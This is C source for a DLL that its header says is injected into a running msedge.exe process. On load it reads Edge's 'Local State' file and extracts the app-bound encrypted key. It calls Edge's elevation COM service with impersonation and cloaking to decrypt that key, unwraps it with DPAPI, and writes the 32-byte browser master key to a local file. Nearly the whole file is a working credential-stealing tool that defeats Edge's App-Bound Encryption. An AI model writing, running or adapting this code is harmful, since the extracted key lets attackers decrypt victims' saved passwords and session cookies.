/* Minimal Edge ABE key extractor DLL (v2 - BSTR protocol).
 * Injected into real msedge.exe. IElevatorEdge::DecryptData takes a
 * BSTR and needs CoSetProxyBlanket(PKT_PRIVACY, IMPERSONATE, CLOAKING). */
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define CHK(x) do { if (!(x)) { fail(#x); return; } } while (0)

static void fail(const char *what) {
    FILE *f = fopen("C:\\Tools\\key_out.txt", "w");
    if (f) { fprintf(f, "ERR %s gle=%lu", what, GetLastError()); fclose(f); }
}

static void stage(const char *s) {
    FILE *f = fopen("C:\\Tools\\abe_stage.txt", "a");
    if (f) { fprintf(f, "%s\n", s); fclose(f); }
}

static void b64decode(const char *in, int inlen, unsigned char **out, int *outlen) {
    int table[256]; int i, v = 0, bits = 0; int len = 0;
    unsigned char *buf;
    for (i = 0; i < 256; i++) table[i] = -1;
    for (i = 0; i < 64; i++) {
        char c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i];
        table[(unsigned char)c] = i;
    }
    buf = (unsigned char *)malloc(inlen * 3 / 4 + 4);
    for (i = 0; i < inlen; i++) {
        int c = table[(unsigned char)in[i]];
        if (c < 0) continue;
        v = (v << 6) | c; bits += 6;
        if (bits >= 8) { bits -= 8; buf[len++] = (v >> bits) & 0xFF; }
    }
    *out = buf; *outlen = len;
}

static char *read_file(const char *path, int *len) {
    FILE *f = fopen(path, "rb");
    char *buf; long sz;
    if (!f) return NULL;
    fseek(f, 0, SEEK_END); sz = ftell(f); fseek(f, 0, SEEK_SET);
    buf = (char *)malloc(sz + 1);
    fread(buf, 1, sz, f); buf[sz] = 0; fclose(f);
    if (len) *len = (int)sz;
    return buf;
}

typedef struct { DWORD cbData; BYTE *pbData; } MYBLOB;

/* DecryptData(BSTR in, BSTR* out, DWORD* err) */
typedef HRESULT (__stdcall *DecryptDataFn)(void *, void *, void **, DWORD *);

typedef HRESULT (__stdcall *SetProxyBlanketFn)(IUnknown *, DWORD, DWORD, void *, DWORD, DWORD, void *, DWORD);

static void do_work(void) {
    stage("do_work_enter");
    static const GUID clsid = {0x1FCBE96C,0x1697,0x43AF,{0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67}};
    static const GUID iids[] = {
        {0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B}},
        {0xA949CB4E,0xC4F9,0x44C4,{0xB2,0x13,0x6B,0xF8,0xAA,0x9A,0xC6,0x9C}},
        {0x8F7B6792,0x784D,0x4047,{0x84,0x5D,0x17,0x82,0xEF,0xBE,0xF2,0x05}},
    };

    char *json; char *k, *e; int jlen, blen; unsigned char *bin = NULL;
    DWORD err = 0, i;
    void *obj = NULL; HRESULT hr; void **vtbl;
    DATA_BLOB din, dout; FILE *f;
    char hex[80];

    json = read_file("C:\\Users\\admin\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State", &jlen);
    CHK(json);
    stage("local_state_read");
    k = strstr(json, "app_bound_encrypted_key");
    CHK(k);
    e = strchr(k, ':'); CHK(e);
    k = strchr(e, '"'); CHK(k);
    k++;
    e = strchr(k, '"'); CHK(e);
    b64decode(k, (int)(e - k), &bin, &blen);
    CHK(bin && blen > 8 && memcmp(bin, "APPB", 4) == 0);
    stage("appb_ok");

    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    {
        int i2; char m[64];
        for (i2 = 0; i2 < 3; i2++) {
            hr = CoCreateInstance(&clsid, NULL, CLSCTX_LOCAL_SERVER, &iids[i2], &obj);
            if (SUCCEEDED(hr)) { sprintf(m, "cocreate_ok_iid%d", i2); stage(m); break; }
            obj = NULL;
        }
    }
    CHK(SUCCEEDED(hr));

    /* proxy blanket: PKT_PRIVACY + IMPERSONATE + DYNAMIC_CLOAKING */
    {
        void **vt = *(void ***)obj;
        SetProxyBlanketFn sb = (SetProxyBlanketFn)vt[0]; /* QI not needed: use oleaut */
        /* CoSetProxyBlanket is an ole32 export, resolve at link time */
    }
    {
        static const GUID IID_IUnknown_ = {0x00000000,0x0000,0x0000,{0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}};
        /* use ole32!CoSetProxyBlanket */
        HMODULE ole32 = GetModuleHandleA("ole32.dll");
        HRESULT (__stdcall *pSetBlanket)(IUnknown *, DWORD, DWORD, void *, DWORD, DWORD, void *, DWORD) = NULL;
        if (ole32) pSetBlanket = (HRESULT (__stdcall *)(IUnknown *, DWORD, DWORD, void *, DWORD, DWORD, void *, DWORD))
            (void *)GetProcAddress(ole32, "CoSetProxyBlanket");
        if (pSetBlanket) {
            hr = pSetBlanket((IUnknown *)obj, 0xA /*RPC_C_AUTHN_DEFAULT*/, 0xFFFFFFFFFFFFFFFF == 0 ? 0 : 0xFFFFffff /*RPC_C_AUTHZ_DEFAULT*/,
                             NULL, 0x6 /*RPC_C_AUTHN_LEVEL_PKT_PRIVACY*/, 0x3 /*RPC_C_IMP_LEVEL_IMPERSONATE*/,
                             NULL, 0x40 /*EOAC_DYNAMIC_CLOAKING*/);
            char m[48]; sprintf(m, "blanket_hr=0x%08lX", (unsigned long)hr); stage(m);
        } else stage("no_setblanket");
    }

    vtbl = *(void ***)obj;
    {
        DecryptDataFn dd = (DecryptDataFn)vtbl[8];   /* DecryptData @ offset 64 */
        HMODULE oleaut = GetModuleHandleA("oleaut32.dll");
        void * (__stdcall *pAlloc)(const char *, UINT) = NULL;
        UINT (__stdcall *pByteLen)(void *) = NULL;
        if (oleaut) {
            pAlloc = (void * (__stdcall *)(const char *, UINT))(void *)GetProcAddress(oleaut, "SysAllocStringByteLen");
            pByteLen = (UINT (__stdcall *)(void *))(void *)GetProcAddress(oleaut, "SysStringByteLen");
        }
        CHK(pAlloc && pByteLen);
        void *inB = pAlloc((const char *)(bin + 4), (UINT)(blen - 4));
        void *outB = NULL;
        CHK(inB);
        hr = dd(obj, inB, &outB, &err);
        if (!(SUCCEEDED(hr) && outB)) {
            char m3[80]; sprintf(m3, "decrypt_hr=0x%08lX out=%p err=%lu", (unsigned long)hr, outB, (unsigned long)err); stage(m3);
        }
        CHK(SUCCEEDED(hr) && outB);
        stage("decrypt_ok");

        UINT olen = pByteLen(outB);
        char m4[48]; sprintf(m4, "plain_len=%u", olen); stage(m4);

        din.cbData = olen; din.pbData = (BYTE *)outB;
        dout.cbData = 0; dout.pbData = NULL;
        CHK(CryptUnprotectData(&din, NULL, NULL, NULL, NULL, 0, &dout));
        stage("dpapi_ok");
        CHK(dout.cbData == 32);

        f = fopen("C:\\Tools\\key_out.txt", "w");
        CHK(f);
        for (i = 0; i < 32; i++) fprintf(f, "%02X", dout.pbData[i]);
        fclose(f);
        stage("key_written");
    }
}

static DWORD WINAPI thread_main(LPVOID p) { (void)p; do_work(); return 0; }

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {
    (void)h; (void)r;
    if (reason == DLL_PROCESS_ATTACH) {
        stage("dllmain_attach");
        DisableThreadLibraryCalls(h);
        CreateThread(NULL, 0, thread_main, NULL, 0, NULL);
    }
    return TRUE;
}

__declspec(dllexport) void __stdcall Bootstrap(LPVOID p) { (void)p; do_work(); }